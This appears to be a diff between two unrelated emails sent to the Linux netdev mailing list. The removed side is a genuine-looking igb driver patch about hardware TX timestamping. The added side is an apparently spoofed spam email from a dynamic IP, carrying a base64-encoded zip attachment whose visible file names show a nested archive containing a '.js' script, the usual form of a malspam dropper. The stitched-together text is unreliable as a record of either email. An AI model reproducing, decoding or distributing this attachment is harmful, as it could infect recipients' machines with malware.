@@ -1,47 +1,55 @@
-From: Cliff Spradlin <cspradlin@google.com>
-Subject: [PATCH net] igb: protect TX timestamping from API misuse
-Date: Fri, 16 Jun 2017 15:37:17 -0700
-Message-ID: <20170616223717.66179-1-cspradlin@google.com>
+From: <kelley@colfaxcommunitynetwork.org>
+Subject: (unknown)
+Date: Fri, 16 Jun 2017 22:37:31 -0000
+Message-ID: <149765265132.16370.12592258701406711118@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-To: netdev@vger.kernel.org
+Content-Type: application/zip; name="01808124726107.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-pg0-f74.google.com ([74.125.83.74]:36867 "EHLO
-        mail-pg0-f74.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1750838AbdFPWhV (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Fri, 16 Jun 2017 18:37:21 -0400
-Received: by mail-pg0-f74.google.com with SMTP id j186so455137pge.4
-        for <netdev@vger.kernel.org>; Fri, 16 Jun 2017 15:37:20 -0700 (PDT)
+Received: from 1-169-95-132.dynamic-ip.hinet.net ([1.169.95.132]:45912 "HELO
+        hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751598AbdFPWhg (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Fri, 16 Jun 2017 18:37:36 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-HW timestamping can only be requested for a packet if the NIC is first
-setup via ioctl(SIOCSHWTSTAMP). If this step was skipped, then the igb
-driver still allowed TX packets to request HW timestamping. In this
-situation, the _IGB_PTP_TX_IN_PROGRESS flag was set and would never
-clear. This prevented any future HW timestamping requests to succeed.
-
-Fix this by checking that the NIC is configured for HW TX timestamping
-before accepting a HW TX timestamping request.
-
-Signed-off-by: Cliff Spradlin <cspradlin@google.com>
----
- drivers/net/ethernet/intel/igb/igb_main.c | 3 ++-
- 1 file changed, 2 insertions(+), 1 deletion(-)
-
-diff --git a/drivers/net/ethernet/intel/igb/igb_main.c b/drivers/net/ethernet/intel/igb/igb_main.c
-index 1cf74aa4ebd9..45c2a9c9fa03 100644
---- a/drivers/net/ethernet/intel/igb/igb_main.c
-+++ b/drivers/net/ethernet/intel/igb/igb_main.c
-@@ -5381,7 +5381,8 @@ netdev_tx_t igb_xmit_frame_ring(struct sk_buff *skb,
- 	if (unlikely(skb_shinfo(skb)->tx_flags & SKBTX_HW_TSTAMP)) {
- 		struct igb_adapter *adapter = netdev_priv(tx_ring->netdev);
- 
--		if (!test_and_set_bit_lock(__IGB_PTP_TX_IN_PROGRESS,
-+		if (adapter->tstamp_config.tx_type & HWTSTAMP_TX_ON &&
-+		    !test_and_set_bit_lock(__IGB_PTP_TX_IN_PROGRESS,
- 					   &adapter->state)) {
- 			skb_shinfo(skb)->tx_flags |= SKBTX_IN_PROGRESS;
- 			tx_flags |= IGB_TX_FLAGS_TSTAMP;
--- 
-2.13.1.518.g3df882009-goog
+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
+AAAAAA==
